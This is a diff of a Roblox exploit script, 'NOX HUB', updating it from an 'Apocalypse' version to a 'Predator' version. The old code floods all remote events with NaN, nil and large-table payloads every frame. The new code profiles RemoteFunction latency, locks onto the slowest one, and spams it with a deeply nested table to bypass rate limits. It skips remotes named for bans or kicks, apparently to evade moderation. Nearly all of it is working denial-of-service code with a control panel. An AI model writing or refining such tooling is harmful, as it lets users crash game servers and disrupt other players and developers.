@@ -1,12 +1,12 @@
 --[[
-    🔱 NOX HUB v36.0 [APOCALYPSE-NOW] 🔱
-    "No more hiding. Total saturation."
+    🔱 NOX HUB v38.0 [PREDATOR-DRONE] 🔱
+    "Don't attack the shield. Attack the crack."
     
-    APOCALYPSE FEATURES:
-    - [RELIABILITY FIX] : Simplified engine loop to ensure execution.
-    - [CONSOLE LOGS] : Prints DEBUG info (F9) to confirm activity.
-    - [TRINITY PAYLOAD] : Rotates between NaN, Nil, and Empty Table per frame.
-    - [GLOBAL SCAN] : Aggressive scanner for ReplicatedStorage/Workspace/Players.
+    PREDATOR FEATURES:
+    - [LATENCY PROFILING] : Measures response time of every RemoteFunction.
+    - [WEAKNESS DETECTION] : Auto-selects the SLOWEST remote (heaviest logic).
+    - [SURGICAL STRIKE] : Focuses 100% of packets on the single vulnerability.
+    - [EFFICIENCY] : Bypasses general rate limits by abusing one expensive logic path.
 ]]
 
 -- // CORE SERVICES //
@@ -16,72 +16,118 @@ local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // 1. APOCALYPSE ENGINE //
+-- // 1. PREDATOR ENGINE //
 local Engine = {
     Active = false,
     Targets = {},
+    BestTarget = nil,
     Buffer = {} 
 }
 
 function Engine:Log(msg)
-    warn("[NOX]: " .. tostring(msg))
+    warn("[NOX PREDATOR]: " .. tostring(msg))
 end
 
-function Engine:Scan()
-    Engine.Log("Scanning world...")
-    Engine.Targets = {}
-    local count = 0
+function Engine:ScanAndProbe(updateCallback)
+    Engine.Log("Scanning frequency...")
+    updateCallback(0, "SCANNING REMOTES...")
     
-    local function check(v)
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+    local candidates = {}
+    
+    -- 1. IDENTIFY CANDIDATES
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteFunction") then
             local n = v.Name:lower()
-            -- Standard Safelist
             if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                     n:find("market") or n:find("purchase") or n:find("shop") or 
                     n:find("product") or n:find("asset") or n:find("prompt") or
                     n:find("devtools") or n:find("console") or n:find("debug") or
                     n:find("warn") or n:find("error") or n:find("report")) then
-                 table.insert(Engine.Targets, v)
-                 count = count + 1
+                 table.insert(candidates, v)
             end
         end
     end
-
-    for _, v in pairs(game:GetDescendants()) do check(v) end
     
-    Engine.Log("Scan complete. Targets found: " .. count)
-    return count
+    updateCallback(0, "PROBING " .. #candidates .. " SIGNALS...")
+    Engine.Log("Probing " .. #candidates .. " remotes...")
+    
+    -- 2. LATENCY PROFILING
+    local worstLag = 0
+    local worstRemote = nil
+    
+    for i, remote in ipairs(candidates) do
+        updateCallback(0, "PROBING ["..i.."/"..#candidates.."]: " .. remote.Name)
+        
+        local start = tick()
+        local success, err = pcall(function()
+            -- We invoke with a simple valid arg to trigger logic
+            return remote:InvokeServer("Ping")
+        end)
+        local duration = tick() - start
+        
+        if success then
+            Engine.Log("Remote ["..remote.Name.."] Response: " .. string.format("%.4f", duration) .. "s")
+            if duration > worstLag then
+                worstLag = duration
+                worstRemote = remote
+            end
+        else
+            Engine.Log("Remote ["..remote.Name.."] Failed/Timed out.")
+        end
+        wait(0.1) -- Don't flood yet
+    end
+    
+    Engine.BestTarget = worstRemote
+    if worstRemote then
+        Engine.Log("WEAKNESS FOUND: " .. worstRemote.Name .. " (" .. string.format("%.4f", worstLag) .. "s latency)")
+        updateCallback(0, "LOCKED: " .. worstRemote.Name)
+    else
+        Engine.Log("No vulnerable RemoteFunctions found via Probe.")
+    end
 end
 
-function Engine:Apocalypse(duration, updateCallback)
-    if Engine.Active then 
-        Engine.Log("Already active!")
-        return 
-    end
+function Engine:Strike(duration, updateCallback)
+    if Engine.Active then return end
     Engine.Active = true
-    Engine.Log("Initiating Apocalypse Protocol...")
     
-    local count = Engine:Scan()
+    -- PHASE 1: PROBE
+    if not Engine.BestTarget then
+        Engine:ScanAndProbe(updateCallback)
+    end
     
-    if count == 0 then
-        updateCallback(0, "NO TARGETS FOUND (CHECK CONSOLE)")
-        Engine.Log("FAILURE: 0 Targets found.")
+    -- FALLBACK: If no RemoteFunction is slow, or none exist, use shotgun mode on Events
+    local TargetList = {}
+    if Engine.BestTarget then
+        TargetList = {Engine.BestTarget}
+    else
+        updateCallback(0, "NO WEAKNESS. ENGAGING SHOTGUN.")
+        -- Fallback to events
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") then 
+                local n = v.Name:lower()
+                 if not (n:find("ban") or n:find("kick") or n:find("admin")) then
+                    table.insert(TargetList, v)
+                 end
+            end
+        end
+    end
+    
+    if #TargetList == 0 then
+        updateCallback(0, "NO TARGETS DETECTED.")
         Engine.Active = false
         return
     end
     
-    -- PAYLOADS
-    local NaN = Vector3.new(0/0, 0/0, 0/0)
-    local PayloadNaN = {NaN, NaN, NaN}
-    local PayloadTable = table.create(100, {})
-    local PayloadNil = nil
-    
+    -- ATTACK
     task.spawn(function()
         local StartTime = tick()
         local EndTime = StartTime + duration
         
-        -- MAIN LOOP (Heartbeat)
-        -- We process ALL targets every frame.
+        -- PAYLOAD: Recursivity (CPU) is usually best for "Heavy Logic" abuse.
+        local Payload = {}
+        local c = Payload
+        for i=1,50 do c[1]={}; c=c[1] end
+        
         local Connection
         Connection = RunService.Heartbeat:Connect(function()
             if not Engine.Active or tick() >= EndTime then
@@ -89,40 +135,36 @@ function Engine:Apocalypse(duration, updateCallback)
                 return
             end
             
-            -- GATLING FIRE
-            -- We iterate all targets and fire 1 shot per frame per target
-            for _, r in pairs(Engine.Targets) do
-                pcall(function()
-                    -- Rotate Attack
-                    local mode = math.random(1, 3)
-                    local p = PayloadNil
-                    if mode == 2 then p = PayloadNaN end
-                    if mode == 3 then p = PayloadTable end
-                    
-                    if r:IsA("RemoteEvent") then
-                        r:FireServer(p)
-                    elseif r:IsA("RemoteFunction") then
-                        task.spawn(function() r:InvokeServer(p) end)
-                    end
-                end)
+            -- FOCUSED FIRE
+            -- We spam the ONE vulnerability.
+            for i = 1, 10 do -- 10 shots per frame on the weak point
+                for _, r in pairs(TargetList) do
+                    pcall(function()
+                        if r:IsA("RemoteFunction") then
+                             task.spawn(function() r:InvokeServer(Payload) end)
+                        else
+                             r:FireServer(Payload)
+                        end
+                    end)
+                end
             end
         end)
         
-        -- UI UPDATE LOOP
         while tick() < EndTime and Engine.Active do
             local remaining = math.ceil(EndTime - tick())
-            updateCallback(remaining, "RAINING FIRE... ["..count.." TARGETS]")
+            local tName = Engine.BestTarget and Engine.BestTarget.Name or "ALL EVENTS"
+            updateCallback(remaining, "FIRING AT: " .. tName)
             wait(1)
         end
         
         if Connection then Connection:Disconnect() end
         Engine.Active = false
-        Engine.Log("Apocalypse finished.")
-        updateCallback(duration, "SYSTEM COOLDOWN")
+        Engine.Log("Strike Complete.")
+        updateCallback(duration, "SYSTEM READY")
     end)
 end
 
--- // 2. COMMAND CENTER UI (Apocalypse Theme) //
+-- // 2. COMMAND CENTER UI (Predator Theme) //
 local Nox = {}
 
 function Nox:CreateUI()
@@ -136,9 +178,9 @@ function Nox:CreateUI()
     local Main = Instance.new("Frame", Screen)
     Main.Size = UDim2.new(0, 500, 0, 350)
     Main.Position = UDim2.new(0.5, -250, 0.5, -175)
-    Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Metal Grey
+    Main.BackgroundColor3 = Color3.fromRGB(15, 5, 5) -- Black/Red
     Main.BorderSizePixel = 2
-    Main.BorderColor3 = Color3.fromRGB(150, 0, 0)
+    Main.BorderColor3 = Color3.fromRGB(200, 0, 0)
     Main.ClipsDescendants = true
     
     local Corner = Instance.new("UICorner", Main)
@@ -146,12 +188,12 @@ function Nox:CreateUI()
     
     local TopBar = Instance.new("Frame", Main)
     TopBar.Size = UDim2.new(1, 0, 0, 40)
-    TopBar.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+    TopBar.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
     
     local Title = Instance.new("TextLabel", TopBar)
-    Title.Text = "NOX APOCALYPSE v36.0"
+    Title.Text = "NOX PREDATOR v38.0"
     Title.Font = Enum.Font.SciFi
-    Title.TextColor3 = Color3.fromRGB(255, 50, 50) 
+    Title.TextColor3 = Color3.fromRGB(255, 0, 0) 
     Title.TextSize = 18
     Title.Size = UDim2.new(0.5, 0, 1, 0)
     Title.Position = UDim2.new(0.05, 0, 0, 0)
@@ -162,7 +204,7 @@ function Nox:CreateUI()
     local Tabs = Instance.new("Frame", Main)
     Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
     Tabs.Position = UDim2.new(0, 0, 0.15, 0)
-    Tabs.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Tabs.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
     Tabs.BorderSizePixel = 0
     
     local function CreateTabBtn(text, order, callback)
@@ -170,15 +212,15 @@ function Nox:CreateUI()
         btn.Size = UDim2.new(1, 0, 0, 40)
         btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
         btn.Text = text
-        btn.TextColor3 = Color3.fromRGB(100, 100, 100)
-        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        btn.TextColor3 = Color3.fromRGB(100, 50, 50)
+        btn.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
         btn.Font = Enum.Font.SciFi
         btn.BorderSizePixel = 0
         
         btn.MouseButton1Click:Connect(function()
-            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(100, 100, 100) c.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end end
+            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(100, 50, 50) c.BackgroundColor3 = Color3.fromRGB(15, 5, 5) end end
             btn.TextColor3 = Color3.fromRGB(255, 0, 0) 
-            btn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
+            btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
             callback()
         end)
         return btn
@@ -196,52 +238,68 @@ function Nox:CreateUI()
     PageAttack.BackgroundTransparency = 1
     
     local StatusLbl = Instance.new("TextLabel", PageAttack)
-    StatusLbl.Text = "TARGET ACQUIRED"
+    StatusLbl.Text = "AWAITING TARGET..."
     StatusLbl.Size = UDim2.new(1, 0, 0, 30)
     StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
-    StatusLbl.TextColor3 = Color3.fromRGB(200, 200, 200)
+    StatusLbl.TextColor3 = Color3.fromRGB(200, 0, 0)
     StatusLbl.Font = Enum.Font.SciFi
     StatusLbl.BackgroundTransparency = 1
     
-    local BufferBarBg = Instance.new("Frame", PageAttack)
-    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
-    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
-    BufferBarBg.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+    local TargetBack = Instance.new("Frame", PageAttack)
+    TargetBack.Size = UDim2.new(0.8, 0, 0.1, 0)
+    TargetBack.Position = UDim2.new(0.1, 0, 0.25, 0)
+    TargetBack.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+    TargetBack.BorderSizePixel = 1
+    TargetBack.BorderColor3 = Color3.fromRGB(150, 0, 0)
+    local TargetLbl = Instance.new("TextLabel", TargetBack)
+    TargetLbl.Size = UDim2.new(1,0,1,0)
+    TargetLbl.BackgroundTransparency = 1
+    TargetLbl.Text = "NO TARGET LOCKED"
+    TargetLbl.TextColor3 = Color3.fromRGB(255,100,100)
+    TargetLbl.Font = Enum.Font.Code
     
-    local BufferBarFill = Instance.new("Frame", BufferBarBg)
-    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
-    BufferBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    -- SCAN BUTTON
+    local ScanBtn = Instance.new("TextButton", PageAttack)
+    ScanBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
+    ScanBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    ScanBtn.Text = "SCAN REMOTES"
+    ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ScanBtn.Font = Enum.Font.SciFi
+    ScanBtn.TextSize = 14
+    local SCorner = Instance.new("UICorner", ScanBtn) SCorner.CornerRadius = UDim.new(0,4)
     
+    -- ATTACK BUTTON
     local MainBtn = Instance.new("TextButton", PageAttack)
-    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
-    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
+    MainBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
+    MainBtn.Position = UDim2.new(0.55, 0, 0.6, 0)
     MainBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-    MainBtn.Text = "START APOCALYPSE (15s)"
+    MainBtn.Text = "EXECUTE"
     MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     MainBtn.Font = Enum.Font.SciFi
-    MainBtn.TextSize = 16
-    local BtnCorner = Instance.new("UICorner", MainBtn)
-    BtnCorner.CornerRadius = UDim.new(0, 4)
-    local BtnStroke = Instance.new("UIStroke", MainBtn)
-    BtnStroke.Color = Color3.fromRGB(255, 0, 0)
+    MainBtn.TextSize = 14
+    local MCorner = Instance.new("UICorner", MainBtn) MCorner.CornerRadius = UDim.new(0,4)
     
-    MainBtn.MouseButton1Click:Connect(function()
-        Engine.Log("Button Clicked!")
+    ScanBtn.MouseButton1Click:Connect(function()
         if not Engine.Active then
-            Engine:Apocalypse(15, function(timeLeft, txt)
+            Engine:ScanAndProbe(function(_, txt)
                 StatusLbl.Text = txt
-                local progress = (15 - timeLeft) / 15
-                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
-                
-                if timeLeft == 0 then
-                   MainBtn.Text = "START APOCALYPSE (15s)"
-                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
+                if Engine.BestTarget then
+                    TargetLbl.Text = "LOCKED: " .. Engine.BestTarget.Name
                 else
-                   MainBtn.Text = "DESTRUCTION... " .. timeLeft
+                     TargetLbl.Text = "SCAN COMPLETE (0 VULNERABILITIES)"
                 end
             end)
-        else
-            Engine.Log("Ignored click: Engine already active.")
+        end
+    end)
+    
+    MainBtn.MouseButton1Click:Connect(function()
+        if not Engine.Active then
+            Engine:Strike(15, function(timeLeft, txt)
+                 StatusLbl.Text = txt
+                 local progress = (15 - timeLeft) / 15
+                 if timeLeft == 0 then MainBtn.Text = "EXECUTE" else MainBtn.Text = tostring(timeLeft) end
+            end)
         end
     end)
     
@@ -251,31 +309,33 @@ function Nox:CreateUI()
     PageVisuals.BackgroundTransparency = 1
     PageVisuals.Visible = false
     
-    local GraphFrame = Instance.new("Frame", PageVisuals)
-    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
-    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-    GraphFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    GraphFrame.BorderColor3 = Color3.fromRGB(150, 0, 0)
-    GraphFrame.BorderSizePixel = 1
+    local Radar = Instance.new("Frame", PageVisuals)
+    Radar.Size = UDim2.new(0.6, 0, 0.6, 0) -- Square aspect ratio roughly
+    Radar.Position = UDim2.new(0.2, 0, 0.2, 0)
+    Radar.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+    Radar.BorderColor3 = Color3.fromRGB(200, 0, 0)
+    Radar.BorderSizePixel = 2
+    local RCorner = Instance.new("UICorner", Radar) RCorner.CornerRadius = UDim.new(1, 0)
     
-    for i = 1, 40 do
-        local bar = Instance.new("Frame", GraphFrame)
-        bar.Size = UDim2.new(0.02, 0, math.random()*0.5, 0)
-        bar.Position = UDim2.new((i-1)*0.025, 0, 1 - bar.Size.Y.Scale, 0)
-        bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-        bar.BorderSizePixel = 0
-        task.spawn(function()
-            while GraphFrame.Parent do
-                local targetHeight = Engine.Active and math.random(0.5, 1) or math.random(0, 0.1)
-                bar:TweenSize(UDim2.new(0.02, 0, targetHeight, 0), "Out", "Quad", 0.05, true)
-                wait(0.05)
-            end
-        end)
-    end
+    local ScanLine = Instance.new("Frame", Radar)
+    ScanLine.Size = UDim2.new(0.5, 0, 0.02, 0)
+    ScanLine.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ScanLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    ScanLine.BackgroundTransparency = 0.5
+    ScanLine.BorderSizePixel = 0
+    
+    task.spawn(function()
+        local rot = 0
+        while Radar.Parent do
+            rot = rot + 5
+            ScanLine.Rotation = rot
+            wait(0.05)
+        end
+    end)
 
     -- TABS LOGIC
-    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
-    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
+    CreateTabBtn("TARGET", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
+    CreateTabBtn("RADAR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
     
      -- DRAG UI
     local dragging, dragInput, dragStart, startPos
@@ -292,7 +352,7 @@ function Nox:CreateUI()
     end)
     UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
     
-    Engine.Log("UI Created Successfully.")
+    Engine:Log("Predator UI Initialized.")
 end
 
 Nox:CreateUI()
